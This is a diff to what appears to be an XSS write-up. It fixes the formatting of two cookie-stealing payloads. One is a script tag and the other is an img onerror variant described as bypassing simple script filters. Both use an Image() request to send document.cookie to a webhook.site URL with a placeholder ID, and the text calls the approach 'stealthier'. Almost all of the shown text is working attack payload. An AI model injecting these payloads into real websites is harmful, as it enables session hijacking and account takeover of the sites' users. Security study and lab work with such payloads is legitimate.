@@ -22,13 +22,13 @@ I chose to use the `Image()` object method. This is stealthier than a `document.
 **Payload:**
 ```javascript
 <script>
-  new Image().src='[https://webhook.site/YOUR-ID?c=](https://webhook.site/YOUR-ID?c=)' + document.cookie;
+  new Image().src='https://webhook.site/YOUR-ID?c=' + document.cookie;
 </script>
 ```
 
 **Alternative (Bypassing simple script filters):**
 ```html
-<img src=x onerror="new Image().src='[https://webhook.site/YOUR-ID?c=](https://webhook.site/YOUR-ID?c=)' + document.cookie">
+<img src=x onerror="new Image().src='https://webhook.site/YOUR-ID?c=' + document.cookie">
 ```
 
 ### 3. Capture
